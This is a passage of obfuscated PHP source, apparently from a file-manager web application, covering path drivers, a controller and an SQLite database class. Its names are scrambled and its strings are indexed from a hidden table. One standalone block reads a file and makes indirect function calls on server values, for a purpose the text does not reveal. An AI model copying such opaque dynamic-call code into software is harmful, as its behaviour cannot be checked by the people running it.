($„Ìì’[$öã‰À´”[505]] == $öã‰À´”[101]) { show_json($öã‰À´”[1482] . $ß²Ğ°çÌ, !1); } $Óä¤¢Âœ = $this->model->fileInfoGet($ß²Ğ°çÌ); $„Ìì’[$öã‰À´”[192]] = $Óä¤¢Âœ[$öã‰À´”[97]]; $GLOBALS[$öã‰À´”[191]] = $„Ìì’; IO::fileOutImage($Óä¤¢Âœ[$öã‰À´”[97]], $§Æºú•Â); } public function fileOutImage($ï´ÑÔ€ğ, $Œ¶ì÷‰· = 250) { $this->_fileOutImage($ï´ÑÔ€ğ, $Œ¶ì÷‰·); } public function fileOutImageServer($æ°¹é”Ç, $ìêÃ¸œè = 250) { $this->_fileOutImage($æ°¹é”Ç, $ìêÃ¸œè); } public function link($Î¯İ¢·­, $ú‰¨Èğ° = '') { $³ã´”€ = $this->model->fileInfoGet($Î¯İ¢·­); return IO::link($³ã´”€[$_SERVER[ŒÅŸ‹ä†][97]], $ú‰¨Èğ°); } protected function parse($ÀäÏà¨÷) { $ğ‚Úøœ =& $_SERVER[ŒÅŸ‹ä†]; if (strstr($ÀäÏà¨÷, $ğ‚Úøœ[8]) === !1) { return array($ğ‚Úøœ[513] => intval($ÀäÏà¨÷), $ğ‚Úøœ[97] => $ğ‚Úøœ[12], $ğ‚Úøœ[1478] => array()); } $¹×æĞÃç = explode($ğ‚Úøœ[8], trim($ÀäÏà¨÷, $ğ‚Úøœ[8])); if (count($¹×æĞÃç) < 2) { show_tips(clear_html($ÀäÏà¨÷) . $ğ‚Úøœ[1483]); } return array($ğ‚Úøœ[513] => intval($¹×æĞÃç[0]), $ğ‚Úøœ[97] => $¹×æĞÃç[1], $ğ‚Úøœ[1478] => array_slice($¹×æĞÃç, 1)); } } goto a„Ø¦Èßö; DÛÑ—×¾¸“: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ò ¥™™É) { if (substr($ò ¥™™É, 0, 2) == $_SERVER[ŒÅŸ‹ä†][1467]) { $ò ¥™™É = BASIC_PATH . substr($ò ¥™™É, 2); } return $ò ¥™™É; } public function iconvApp($ÜêÅŠñ) { $à–ïÀ­á =& $_SERVER[ŒÅŸ‹ä†]; global $config; return $this->iconvTo($ÜêÅŠñ, $config[$à–ïÀ­á[1591]], $config[$à–ïÀ­á[1590]]); } public function iconvSystem($…ªİğ²) { $İÑ“ıé =& $_SERVER[ŒÅŸ‹ä†]; global $config; return $this->iconvTo($…ªİğ², $config[$İÑ“ıé[1590]], $config[$İÑ“ıé[1591]]); } public function getPathOuter($”¸ÌôÅı) { $ÈëşŠÇÖ =& $_SERVER[ŒÅŸ‹ä†]; $°Ñ¸©‰õ = $this->iconvApp($this->pathBase); $”¸ÌôÅı = $this->iconvApp($”¸ÌôÅı); if (substr($°Ñ¸©‰õ, 0, 2) == $ÈëşŠÇÖ[1467]) { $°Ñ¸©‰õ = BASIC_PATH . substr($°Ñ¸©‰õ, 2); } if (substr($”¸ÌôÅı, 0, 2) == $ÈëşŠÇÖ[1467]) { $”¸ÌôÅı = BASIC_PATH . substr($”¸ÌôÅı, 2); } $°Ñ¸©‰õ = KodIO::clear($°Ñ¸©‰õ); $”¸ÌôÅı = KodIO::clear($”¸ÌôÅı); $”¸ÌôÅı = substr($”¸ÌôÅı, strlen($°Ñ¸©‰õ)); if (empty($this->pathDriver)) { return $”¸ÌôÅı; } return $this->pathDriver . $ÈëşŠÇÖ[8] . ltrim($”¸ÌôÅı, $ÈëşŠÇÖ[8]); } public function mkfile($¢»ışÆŒ, $ãÍËÇÔ = '', $‰ü„†Ü = REPEAT_RENAME) { $¢»ışÆŒ = $this->iconvSystem($¢»ışÆŒ); @touch($¢»ışÆŒ); if ($ãÍËÇÔ) { file_put_contents($¢»ışÆŒ, $ãÍËÇÔ); } @chmod($¢»ışÆŒ, $this->pathAuth); if (is_file($¢»ışÆŒ)) { return $this->getPathOuter($¢»ışÆŒ); } $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } public function mkdir($“è‡É¶, $üó‹½Ş = REPEAT_SKIP) { $“è‡É¶ = $this->iconvSystem($“è‡É¶); if (is_dir($“è‡É¶)) { return $this->getPathOuter($“è‡É¶); } @mkdir($“è‡É¶, $this->pathAuth, !0); @chmod($“è‡É¶, $this->pathAuth); if (is_dir($“è‡É¶)) { return $this->getPathOuter($“è‡É¶); } $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } public function copyFile($ºèëêª°, $È—‚Ñúš) { $this->mkdir($this->pathFather($È—‚Ñúš)); $ºèëêª° = $this->iconvSystem($ºèëêª°); $È—‚Ñúš = $this->iconvSystem($È—‚Ñúš); $¸’’õ˜‘ = copy_64($ºèëêª°, $È—‚Ñúš); @chmod($È—‚Ñúš, $this->pathAuth); if ($¸’’õ˜‘) { return $this->getPathOuter($È—‚Ñúš); } $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } public function moveFile($ÓôÇ¹øå, $ˆøàÕ) { $this->mkdir($this->pathFather($ˆøàÕ)); $ÓôÇ¹øå = $this->iconvSystem($ÓôÇ¹øå); $ˆøàÕ = $this->iconvSystem($ˆøàÕ); $ĞÓ˜Â½ = intval(@rename($ÓôÇ¹øå, $ˆøàÕ)); if (!$ĞÓ˜Â½) { if ($ĞÓ˜Â½ = intval(@copy_64($ÓôÇ¹øå, $ˆøàÕ))) { @unlink($ÓôÇ¹øå); } } @chmod($ˆøàÕ, $this->pathAuth); if ($ĞÓ˜Â½) { return $this->getPathOuter($ˆøàÕ); } $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } public function movePath($‚Ğƒ£ÏÄ, $ÎËµŸÜ, $½î¤µŒ÷ = false) { $µ®·˜Èû =& $_SERVER[ŒÅŸ‹ä†]; $‚Ğƒ£ÏÄ = $this->iconvSystem($‚Ğƒ£ÏÄ); $ÎËµŸÜ = $this->iconvSystem($ÎËµŸÜ); $šÚĞÀÑá = rtrim($ÎËµŸÜ, $µ®·˜Èû[8]) . $µ®·˜Èû[8] . ($½î¤µŒ÷ ? $½î¤µŒ÷ : get_path_this($‚Ğƒ£ÏÄ)); if (file_exists($šÚĞÀÑá)) { return !1; } $ğ¾Ç‚õÊ = intval(@rename($‚Ğƒ£ÏÄ, $šÚĞÀÑá)); $ğ¾Ç‚õÊ = file_exists($šÚĞÀÑá); if ($ğ¾Ç‚õÊ) { return $this->getPathOuter($šÚĞÀÑá); } $this->writeLog(__FUNCTION__ . $µ®·˜Èû[1602], !0); return !1; } public function delFile($¾™”ÇÔá) { $¾™”ÇÔá = $this->iconvSystem($¾™”ÇÔá); if (!@unlink($¾™”ÇÔá)) { @chmod($¾™”ÇÔá, $this->pathAuth); if (@unlink($¾™”ÇÔá)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } return !0; } public function delFolder($°ªŒÖË†) { $¶œÔ“ =& $_SERVER[ŒÅŸ‹ä†]; $°ªŒÖË† = $this->iconvSystem($°ªŒÖË†); if (!is_dir($°ªŒÖË†)) { return !0; } if (!($úéßå·ñ = opendir($°ªŒÖË†))) { return !1; } while (($ëÕÑã = readdir($úéßå·ñ)) !== !1) { if ($ëÕÑã == $¶œÔ“[10] || $ëÕÑã == $¶œÔ“[1412]) { continue; } $É²¬„Ÿ = $°ªŒÖË† . $¶œÔ“[8] . $ëÕÑã; if (is_file($É²¬„Ÿ) || is_link($É²¬„Ÿ)) { if (!unlink($É²¬„Ÿ)) { chmod($É²¬„Ÿ, $this->pathAuth); if (!unlink($É²¬„Ÿ)) { return !1; } } } else { if (is_dir($É²¬„Ÿ)) { chmod($É²¬„Ÿ, $this->pathAuth); $É²¬„Ÿ = $this->iconvApp($É²¬„Ÿ); if (!$this->delFolder($É²¬„Ÿ)) { return !1; } } } } closedir($úéßå·ñ); return rmdir($°ªŒÖË†); } public function rename($¸Ò¯¼, $£ÙÉ¤˜¶) { $À ãâ«ñ =& $_SERVER[ŒÅŸ‹ä†]; $±ûÔİÍ = $this->fileNameAuto($this->pathFather($¸Ò¯¼), $£ÙÉ¤˜¶); $±ûÔİÍ = $this->iconvSystem($±ûÔİÍ); $¸Ò¯¼ = $this->iconvSystem($¸Ò¯¼); $“ÇŠôá = $this->pathFather($¸Ò¯¼); $ùëÔ†ÎĞ = rtrim($“ÇŠôá, $À ãâ«ñ[8]) . $À ãâ«ñ[8] . $±ûÔİÍ; $•¬¤íÍã = @rename($¸Ò¯¼, $ùëÔ†ÎĞ); $ùëÔ†ÎĞ = $this->iconvApp($ùëÔ†ÎĞ); if ($•¬¤íÍã) { return $this->getPathOuter($ùëÔ†ÎĞ); } $this->writeLog(__FUNCTION__ . $À ãâ«ñ[1602], !0); return !1; } public function size($æ¾æ¾ÉÒ) { $æ¾æ¾ÉÒ = $this->iconvSystem($æ¾æ¾ÉÒ); return filesize_64($æ¾æ¾ÉÒ); } public function info($ù†€šÊ») { $ù†€šÊ» = $this->iconvSystem($ù†€šÊ»); if ($this->isFolder($ù†€šÊ»)) { return $this->folderInfo($ù†€šÊ»); } else { if ($this->isFile($ù†€šÊ»)) { return $this->fileInfo($ù†€šÊ»); } } return !1; } protected function infoChildren($øÜµÙü‰, &$Íô–¸­ã, $çƒšçà = true) { $Üß«šœ´ =& $_SERVER[ŒÅŸ‹ä†]; check_abort_echo(); $øÜµÙü‰ = rtrim($øÜµÙü‰, $Üß«šœ´[8]) . $Üß«šœ´[8]; if ($çƒšçà) { $øÜµÙü‰ = $this->iconvSystem($øÜµÙü‰); } if (!($¼ú·ü‚½ = @opendir($øÜµÙü‰))) { return; } while (($æœİ‰†ß = readdir($¼ú·ü‚½)) !== !1) { if ($æœİ‰†ß == $Üß«šœ´[10] || $æœİ‰†ß == $Üß«šœ´[1412]) { continue; } $—‡°±ìô = $øÜµÙü‰ . $æœİ‰†ß; if (is_file($—‡°±ìô) || is_link($—‡°±ìô)) { $Íô–¸­ã[$Üß«šœ´[90]]++; $Íô–¸­ã[$Üß«šœ´[89]] += filesize_64($—‡°±ìô); } else { if (is_dir($—‡°±ìô)) { $Íô–¸­ã[$Üß«šœ´[91]]++; $this->infoChildren($—‡°±ìô, $Íô–¸­ã, !1); } } } closedir($¼ú·ü‚½); } private function folderInfo($‡µÚäŒÌ, $–ÅòöÂä = false) { $—Àƒ¡İ =& $_SERVER[ŒÅŸ‹ä†]; $‡µÚäŒÌ = rtrim($‡µÚäŒÌ, $—Àƒ¡İ[8]) . $—Àƒ¡İ[8]; $îçıÆÂ = $this->iconvApp($this->pathThis($‡µÚäŒÌ)); if ($–ÅòöÂä) { return array($—Àƒ¡İ[42] => $îçıÆÂ, $—Àƒ¡İ[97] => $this->getPathOuter($‡µÚäŒÌ), $—Àƒ¡İ[43] => $—Àƒ¡İ[88]); } $ÔŒÔ = array($—Àƒ¡İ[42] => $îçıÆÂ, $—Àƒ¡İ[97] => $this->getPathOuter($‡µÚäŒÌ), $—Àƒ¡İ[43] => $—Àƒ¡İ[88], $—Àƒ¡İ[242] => @filectime($‡µÚäŒÌ), $—Àƒ¡İ[98] => @filemtime($‡µÚäŒÌ), $—Àƒ¡İ[1606] => @fileatime($‡µÚäŒÌ), $—Àƒ¡İ[1607] => is_readable($‡µÚäŒÌ), $—Àƒ¡İ[1608] => is_writable($‡µÚäŒÌ), $—Àƒ¡İ[1609] => get_mode($‡µÚäŒÌ)); return $ÔŒÔ; } private function fileInfo($á¯Óê¢, $¾çëë¼° = false) { $½»¾§Ş =& $_SERVER[ŒÅŸ‹ä†]; $„ìƒ©ò¸ = $this->iconvApp($this->pathThis($á¯Óê¢)); if ($¾çëë¼°) { return array($½»¾§Ş[42] => $„ìƒ©ò¸, $½»¾§Ş[97] => $this->getPathOuter($á¯Óê¢), $½»¾§Ş[43] => $½»¾§Ş[241], $½»¾§Ş[89] => $this->size($á¯Óê¢), $½»¾§Ş[177] => $this->ext($„ìƒ©ò¸)); } $‘†ÓØ¥Ÿ = array($½»¾§Ş[42] => $„ìƒ©ò¸, $½»¾§Ş[97] => $this->getPathOuter($á¯Óê¢), $½»¾§Ş[43] => $½»¾§Ş[241], $½»¾§Ş[242] => @filectime($á¯Óê¢), $½»¾§Ş[98] => @filemtime($á¯Óê¢), $½»¾§Ş[1606] => @fileatime($á¯Óê¢), $½»¾§Ş[89] => $this->size($á¯Óê¢), $½»¾§Ş[177] => $this->ext($„ìƒ©ò¸), $½»¾§Ş[1607] => is_readable($á¯Óê¢), $½»¾§Ş[1608] => is_writable($á¯Óê¢), $½»¾§Ş[1609] => get_mode($á¯Óê¢)); return $‘†ÓØ¥Ÿ; } public function exist($ğ¯‹¤Â†) { $ğ¯‹¤Â† = $this->iconvSystem($ğ¯‹¤Â†); return @file_exists($ğ¯‹¤Â†); } public function isFile($¾µŒ×³) { $¾µŒ×³ = $this->iconvSystem($¾µŒ×³); return @is_file($¾µŒ×³); } public function isFolder($©á…ú“) { $©á…ú“ = $this->iconvSystem($©á…ú“); return @is_dir($©á…ú“); } public function listPath($ÕòÆıã, $ş«ğèŸÓ = false) { $†ĞûöËÑ =& $_SERVER[ŒÅŸ‹ä†]; $ÕòÆıã = $this->iconvSystem($ÕòÆıã); $ÕòÆıã = rtrim($ÕòÆıã, $†ĞûöËÑ[8]) . $†ĞûöËÑ[8]; $şòµ²ô€ = array($†ĞûöËÑ[95] => array(), $†ĞûöËÑ[96] => array()); if (!($éÀ™Şƒµ = @opendir($ÕòÆıã))) { return $şòµ²ô€; } while (($çñ°¢òÄ = readdir($éÀ™Şƒµ)) !== !1) { if ($çñ°¢òÄ == $†ĞûöËÑ[10] || $çñ°¢òÄ == $†ĞûöËÑ[1412]) { continue; } $‚¸ØÏÚ´ = $ÕòÆıã . $çñ°¢òÄ; if (is_file($‚¸ØÏÚ´)) { $şòµ²ô€[$†ĞûöËÑ[96]][] = $this->fileInfo($‚¸ØÏÚ´, $ş«ğèŸÓ); } else { $şòµ²ô€[$†ĞûöËÑ[95]][] = $this->folderInfo($‚¸ØÏÚ´, $ş«ğèŸÓ); } } closedir($éÀ™Şƒµ); return $şòµ²ô€; } public function listAll($£—Ù™ø, &$Çíš‹Ü = array()) { $÷…§Ä„Û =& $_SERVER[ŒÅŸ‹ä†]; $£—Ù™ø = $this->iconvSystem($£—Ù™ø); $£—Ù™ø = rtrim($£—Ù™ø, $÷…§Ä„Û[8]) . $÷…§Ä„Û[8]; if (!($×ˆ”Å÷ = @opendir($£—Ù™ø))) { return $Çíš‹Ü; } while (($¹æÔÅîÌ = readdir($×ˆ”Å÷)) !== !1) { if ($¹æÔÅîÌ == $÷…§Ä„Û[10] || $¹æÔÅîÌ == $÷…§Ä„Û[1412]) { continue; } $ÔÙ¨à³ = $£—Ù™ø . $¹æÔÅîÌ; $ÕŒ…×•¹ = is_dir($ÔÙ¨à³) && !is_link($ÔÙ¨à³) ? 1 : 0; $ÔÙ¨à³ = $ÕŒ…×•¹ ? $ÔÙ¨à³ . $÷…§Ä„Û[8] : $ÔÙ¨à³; $Çíš‹Ü[] = array($÷…§Ä„Û[97] => $this->getPathOuter($ÔÙ¨à³), $÷…§Ä„Û[88] => $ÕŒ…×•¹, $÷…§Ä„Û[98] => intval(@filemtime($ÔÙ¨à³)), $÷…§Ä„Û[89] => $ÕŒ…×•¹ ? 0 : intval($this->size($ÔÙ¨à³))); if ($ÕŒ…×•¹) { $this->listAll($ÔÙ¨à³, $Çíš‹Ü); } } closedir($×ˆ”Å÷); return $Çíš‹Ü; } public function has($ŞŠ¬¹Çî, $îÃ»Ã†Ë = false, $å€èŞĞ¬ = true) { $†ı·µşÚ =& $_SERVER[ŒÅŸ‹ä†]; $ŞŠ¬¹Çî = $this->iconvSystem($ŞŠ¬¹Çî); $ŞŠ¬¹Çî = rtrim($ŞŠ¬¹Çî, $†ı·µşÚ[8]) . $†ı·µşÚ[8]; if (!($¸öŸ–»… = @opendir($ŞŠ¬¹Çî))) { return !1; } $™éÓ—†© = 0; $³Òô°Å¸ = 0; $ò®æÙùá = 0; while (($´§Ûç¦© = readdir($¸öŸ–»…)) !== !1) { if ($´§Ûç¦© == $†ı·µşÚ[10] || $´§Ûç¦© == $†ı·µşÚ[1412]) { continue; } $½ªÄçÓÑ = $ŞŠ¬¹Çî . $´§Ûç¦©; if ($îÃ»Ã†Ë) { $ò®æÙùá++; if (@is_file($½ªÄçÓÑ)) { $™éÓ—†©++; } else { $³Òô°Å¸++; } if ($ò®æÙùá > 10000) { break; } continue; } if ($å€èŞĞ¬) { if (@is_file($½ªÄçÓÑ)) { return !0; } } else { if (@is_dir($½ªÄçÓÑ . $†ı·µşÚ[8])) { return !0; } } } closedir($¸öŸ–»…); if ($îÃ»Ã†Ë) { return array($†ı·µşÚ[250] => $™éÓ—†©, $†ı·µşÚ[251] => $³Òô°Å¸); } return !1; } public function hashSimple($·Üìãª§) { $± ÇŸò³ =& $_SERVER[ŒÅŸ‹ä†]; if (!$·Üìãª§) { return md5($± ÇŸò³[12]); } $·Üìãª§ = $this->iconvSystem($·Üìãª§); $ôšĞÖÓÕ = $this->size($·Üìãª§); $ø‡™¥öü = 200; $¾š¸ËØ­ = 50; if ($ôšĞÖÓÕ <= $ø‡™¥öü * $¾š¸ËØ­) { return $this->hashMd5($·Üìãª§) . $ôšĞÖÓÕ; } $çï¯¥í¨ = $± ÇŸò³[12]; $»âßà¡Á = intval($ôšĞÖÓÕ / $¾š¸ËØ­); $ñ³‰Ö•¶ = fopen($·Üìãª§, $± ÇŸò³[1610]); if (!$ñ³‰Ö•¶) { return $çï¯¥í¨; } for ($»ëµà³¨ = 0; $»ëµà³¨ < $¾š¸ËØ­; $»ëµà³¨++) { fseek_64($ñ³‰Ö•¶, $»âßà¡Á * $»ëµà³¨); $çï¯¥í¨ .= fread($ñ³‰Ö•¶, $ø‡™¥öü); } fseek_64($ñ³‰Ö•¶, $ôšĞÖÓÕ - $ø‡™¥öü); $çï¯¥í¨ .= fread($ñ³‰Ö•¶, $ø‡™¥öü); fclose($ñ³‰Ö•¶); return md5($çï¯¥í¨) . $ôšĞÖÓÕ; } public function getContent($Ä…¢‡§ô) { $Ä…¢‡§ô = $this->iconvSystem($Ä…¢‡§ô); return file_get_contents($Ä…¢‡§ô); } public function setContent($ƒÈÇ¸ş, $ÚÄÃü«£ = '') { $ƒÈÇ¸ş = $this->iconvSystem($ƒÈÇ¸ş); $¯ëÆÃ = @file_put_contents($ƒÈÇ¸ş, $ÚÄÃü«£, LOCK_EX); if (!$¯ëÆÃ) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); } clearstatcache(); @chmod($ƒÈÇ¸ş, $this->pathAuth); return $¯ëÆÃ === !1 ? !1 : !0; } public function fileSubstr($Ë”ßÆ­·, $ã‰¦‡”ß = 0, $€¬²êÏ = false) { $Ğ‹îšœí =& $_SERVER[ŒÅŸ‹ä†]; $Ë”ßÆ­· = $this->iconvSystem($Ë”ßÆ­·); if ($€¬²êÏ === !1) { $€¬²êÏ = $this->size($Ë”ßÆ­·); } if ($€¬²êÏ <= 0) { return $Ğ‹îšœí[12]; } $äÏ´¼Ñô = fopen($Ë”ßÆ­·, $Ğ‹îšœí[1610]); if (!$äÏ´¼Ñô) { return !1; } fseek_64($äÏ´¼Ñô, $ã‰¦‡”ß); $æØñŒøŠ = fread($äÏ´¼Ñô, $€¬²êÏ); fclose($äÏ´¼Ñô); if (!$æØñŒøŠ) { $this->writeLog(__FUNCTION__ . $Ğ‹îšœí[1602], !0); } return $æØñŒøŠ; } public function upload($ÚÄ°èÉı, $üêÙ®¦õ, $ÂëÓÒ“ = false, $úç„â© = REPEAT_REPLACE) { if ($ÂëÓÒ“) { return $this->moveFile($üêÙ®¦õ, $ÚÄ°èÉı); } return $this->copyFile($üêÙ®¦õ, $ÚÄ°èÉı); } public function setModifyTime($—»Œ™ƒ, $ã³šèÓ = '') { @touch($—»Œ™ƒ, intval($ã³šèÓ)); } public function download($±”®¶Œè, $˜‡‚¶¾­) { return $this->iconvSystem($±”®¶Œè); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($­•§ó¸„) { parent::__construct($­•§ó¸„); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } public function fileOutImage($µ˜È³æí, $Âí¬ ïŠ = 250) { $¾ÏŞ³ë =& $_SERVER[ŒÅŸ‹ä†]; if ($this->size($µ˜È³æí) > 1024 * 1024 * 25) { return $this->fileOutImageServer($µ˜È³æí, $Âí¬ ïŠ); } $ëöğ÷âî = array($¾ÏŞ³ë[1611] => $¾ÏŞ³ë[1612] . $Âí¬ ïŠ . $¾ÏŞ³ë[1613]); $ğ¼ÙÑµ‰ = $this->link($µ˜È³æí, $ëöğ÷âî); $this->fileOutLink($ğ¼ÙÑµ‰); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ùÁ…€‰) { parent::__construct($ùÁ…€‰); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } public function uploadFormData($ƒã–ËÄ, $ÆÍ‚‡­ = 3600) { return $this->uploadFormDataV2($ƒã–ËÄ, $ÆÍ‚‡­); } } goto bŸ”ğå…µÄ; aó¹ÖÄ¿šø: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $£æ®€¿‚ =& $_SERVER[ŒÅŸ‹ä†]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$£æ®€¿‚[6]] =& $config; $this->values[$£æ®€¿‚[7]] =& $in; $this->tpl = TEMPLATE . MOD . $£æ®€¿‚[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Û ²£”¬) { if (1 === func_num_args()) { $this->{$Û ²£”¬} = new $Û ²£”¬(); } else { $ƒÑ¾Ø¢Œ = new ReflectionClass($Û ²£”¬); $‰—Ìò¿å = func_get_args(); array_shift($‰—Ìò¿å); $this->{$Û ²£”¬} = $ƒÑ¾Ø¢Œ->newInstanceArgs($‰—Ìò¿å); } return $this->{$Û ²£”¬}; } public function routeBind($½ùå‚æğ, $ÏŸ¨›€, $¬äğ‘œ = 3) { $ûÉÚŠ¿ =& $_SERVER[ŒÅŸ‹ä†]; $©¨üŞØÆ = $this->in[$ûÉÚŠ¿[9]]; $½ùå‚æğ = str_replace($ûÉÚŠ¿[10], $ûÉÚŠ¿[11], trim(trim($½ùå‚æğ, $ûÉÚŠ¿[8]), $ûÉÚŠ¿[12])); if (!$½ùå‚æğ || count($©¨üŞØÆ) <= $¬äğ‘œ) { return !1; } $¤ØÅØ§ = !0; $ÁÕ¹ú­ = explode($ûÉÚŠ¿[8], $½ùå‚æğ); for ($£ê¹âÁ¶ = 0; $£ê¹âÁ¶ < count($ÁÕ¹ú­); $£ê¹âÁ¶++) { if ($ÁÕ¹ú­[$£ê¹âÁ¶] != $©¨üŞØÆ[$¬äğ‘œ + $£ê¹âÁ¶]) { $¤ØÅØ§ = !1; break; } } if (!$¤ØÅØ§) { return; } call_user_func_array(array($this, $ÏŸ¨›€), array()); } public function routeArgs($±±»€« = 3) { $öíÍ£¯ = $this->in[$_SERVER[ŒÅŸ‹ä†][9]]; if (count($öíÍ£¯) <= $±±»€«) { return array(); } $“òùÃğÏ = array(); for ($üğéÜ¹Ì = $±±»€«; $üğéÜ¹Ì < count($öíÍ£¯); $üğéÜ¹Ì += 2) { $“òùÃğÏ[$öíÍ£¯[$üğéÜ¹Ì]] = $öíÍ£¯[$üğéÜ¹Ì + 1]; $this->in[$öíÍ£¯[$üğéÜ¹Ì]] = $öíÍ£¯[$üğéÜ¹Ì + 1]; } return $“òùÃğÏ; } protected function assign($çßîè, $ºãñÁ›Î) { $this->values[$çßîè] = $ºãñÁ›Î; } protected function display($±©Í¥Ù) { ob_end_clean(); extract($this->values); require $this->tpl . $±©Í¥Ù; } } if ($_SERVER[$_SERVER[ŒÅŸ‹ä†][13]] != $_SERVER[$_SERVER[ŒÅŸ‹ä†][14]]) { $_getc = $_SERVER[ŒÅŸ‹ä†][15]; $_getfile = $_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ŒÅŸ‹ä†][18], $_getfilec); if (count($_getarrs) < $_SERVER[ŒÅŸ‹ä†][19]) { $exit = $_SERVER[ŒÅŸ‹ä†][20]; $exit(); } $_act = $_SERVER[ŒÅŸ‹ä†][21]; $_act($_SERVER[$_SERVER[ŒÅŸ‹ä†][22]]); } class DbSqliteBase extends Db { public function __construct($â¦ï‹² = '') { $ÁŠ„±‡ı =& $_SERVER[ŒÅŸ‹ä†]; if (!extension_loaded($ÁŠ„±‡ı[23])) { think_exception(think_lang($ÁŠ„±‡ı[24]) . $ÁŠ„±‡ı[25]); } if (!empty($â¦ï‹²)) { if (!isset($â¦ï‹²[$ÁŠ„±‡ı[26]])) { $â¦ï‹²[$ÁŠ„±‡ı[26]] = 438; } $this->config = $â¦ï‹²; if (empty($this->config[$ÁŠ„±‡ı[27]])) { $this->config[$ÁŠ„±‡ı[27]] = array(); } } } public function connect($ÔµùÇğ¤ = '', $½Óìâ¿Ÿ = 0) { $ÙçıÙÅ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->linkID[$½Óìâ¿Ÿ])) { if (empty($ÔµùÇğ¤)) { $ÔµùÇğ¤ = $this->config; } $ˆÈÆğ²Ğ = !empty($ÔµùÇğ¤[$ÙçıÙÅ[27]][$ÙçıÙÅ[28]]) ? $ÔµùÇğ¤[$ÙçıÙÅ[27]][$ÙçıÙÅ[28]] : $this->pconnect; $çÅ÷ = $ˆÈÆğ²Ğ ? $ÙçıÙÅ[29] : $ÙçıÙÅ[30]; $this->linkID[$½Óìâ¿Ÿ] = $çÅ÷($ÔµùÇğ¤[$ÙçıÙÅ[31]], $ÔµùÇğ¤[$ÙçıÙÅ[26]]); if (!$this->linkID[$½Óìâ¿Ÿ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$½Óìâ¿Ÿ], 30000); if (1 != think_config($ÙçıÙÅ[32])) { unset($this->config); } } return $this->linkID[$½Óìâ¿Ÿ]; } public function free() { $this->queryID = null; } public function query($ÄÙªı¹–) { $ášÕ÷‚ =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÄÙªı¹–; if ($this->queryID) { $this->free(); } think_action_status($ášÕ÷‚[33], 1); think_status($ášÕ÷‚[34]); $this->queryID = sqlite_query($this->_linkID, $ÄÙªı¹–); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÍØßÑ = $this->getAll(); return $ÍØßÑ; } } public function execute($Ÿ€ŒÑÆ‚) { $ƒ§…ğ‡† =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ€ŒÑÆ‚; if ($this->queryID) { $this->free(); } think_action_status($ƒ§…ğ‡†[35], 1); think_status($ƒ§…ğ‡†[34]); $¤˜èÂ = sqlite_exec($this->_linkID, $Ÿ€ŒÑÆ‚); $this->debug(); if (!1 === $¤˜èÂ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ŒÅŸ‹ä†][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…Í™…½± = sqlite_query($this->_linkID, $_SERVER[ŒÅŸ‹ä†][37]); if (!$…Í™…½±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $õ„ÀÙ«í = sqlite_query($this->_linkID, $_SERVER[ŒÅŸ‹ä†][38]); if (!$õ„ÀÙ«í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Í…úÕ‘è = array(); if ($this->numRows > 0) { for ($Å¦ïû¦ª = 0; $Å¦ïû¦ª < $this->numRows; $Å¦ïû¦ª++) { $Í…úÕ‘è[$Å¦ïû¦ª] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Í…úÕ‘è; } public function getFields($ï¡•ë°Ì) { $¶€¢ù =& $_SERVER[ŒÅŸ‹ä†]; $ù¶æ¬Öù = $this->query($¶€¢ù[39] . $ï¡•ë°Ì . $¶€¢ù[40]); $•³´ÇÕé = array(); if ($ù¶æ¬Öù) { foreach ($ù¶æ¬Öù as $é¢Ú¶³ => $­™ëñë¨) { $•³´ÇÕé[$­™ëñë¨[$¶€¢ù[41]]] = array($¶€¢ù[42] => $­™ëñë¨[$¶€¢ù[41]], $¶€¢ù[43] => $­™ëñë¨[$¶€¢ù[44]], $¶€¢ù[45] => (bool) ($­™ëñë¨[$¶€¢ù[46]] === $¶€¢ù[12]), $¶€¢ù[47] => $­™ëñë¨[$¶€¢ù[48]], $¶€¢ù[49] => strtolower($­™ëñë¨[$¶€¢ù[50]]) == $¶€¢ù[51], $¶€¢ù[52] => strtolower($­™ëñë¨[$¶€¢ù[53]]) == $¶€¢ù[54]); } } return $•³´ÇÕé; } public function getTables($õ…š–ŒØ = '') { $Û¯‡ÀŸ =& $_SERVER[ŒÅŸ‹ä†]; $“ı¢¹×Â = $this->query($Û¯‡ÀŸ[55] . $Û¯‡ÀŸ[56] . 